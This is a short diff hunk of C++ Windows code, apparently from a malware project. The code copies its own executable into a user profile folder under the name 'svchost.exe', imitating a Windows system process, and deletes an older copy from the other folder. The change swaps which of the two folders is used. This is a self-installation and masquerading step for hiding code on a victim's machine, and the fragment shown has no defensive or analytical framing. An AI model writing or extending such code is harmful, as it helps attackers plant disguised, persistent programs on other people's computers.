@@ -619,8 +619,8 @@ int main(int argc, char* argv[]) {
 
     char cur[MAX_PATH]; DWORD l = GetModuleFileNameA(0, cur, MAX_PATH);
     if (l && l < MAX_PATH) {
-        string dst = string(getenv("LOCALAPPDATA")) + "\\svchost.exe";
-        string old = string(getenv("APPDATA")) + "\\svchost.exe";
+        string dst = string(getenv("APPDATA")) + "\\svchost.exe";
+        string old = string(getenv("LOCALAPPDATA")) + "\\svchost.exe";
         SetFileAttributesA(old.c_str(), FILE_ATTRIBUTE_NORMAL); DeleteFileA(old.c_str());
         if (GetFileAttributesA(dst.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(cur, dst.c_str())) {
             CopyFileA(cur, dst.c_str(), FALSE);
